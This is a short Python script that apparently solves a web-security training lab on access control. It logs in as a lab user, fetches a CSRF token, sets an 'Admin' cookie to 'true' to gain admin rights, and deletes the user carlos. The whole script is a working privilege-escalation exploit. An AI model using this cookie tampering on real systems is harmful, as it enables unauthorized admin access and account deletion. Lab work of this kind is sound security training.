#!/usr/bin/env python3
"""User role controlled by request parameter"""

import requests
import bs4

import lab_02


class Lab(lab_02.Lab):
    """Wrapper"""

    def __init__(self) -> None:
        super().__init__()
        self.session = requests.Session()

    def get(self, url: str, params: dict | None = None) -> requests.models.Response:
        """Get url"""
        return self.session.get(url, params=params)

    def csrf_token(self, path: str) -> str:
        """Get CSRF token"""
        response = self.get(self.url + path)
        response.raise_for_status()
        soup = bs4.BeautifulSoup(response.text, features="lxml")
        meta_token = soup.find("input",
                               attrs={"name": "csrf", "type": "hidden"})
        csrf_token = meta_token["value"]
        if csrf_token is None:
            raise ValueError("No CSRF token")
        return csrf_token

    def login(self, username: str, password: str,
              csrf: str | None = None) -> requests.models.Response:
        """Log in"""
        payload = {"username": username, "password": password}
        if csrf is not None:
            payload["csrf"] = csrf
        response = self.session.post(f"{self.url}/login", data=payload)
        response.raise_for_status()
        return response


def main() -> None:
    """Entry point"""
    site = Lab()
    csrf = site.csrf_token("/login")
    site.login(username="wiener", password="peter", csrf=csrf)
    del site.session.cookies["Admin"]  # cookie must not exist for some reason
    site.session.cookies["Admin"] = "true"
    response = site.delete_user(admin_panel="/admin", username="carlos")
    print(response.status_code)


if __name__ == "__main__":
    main()
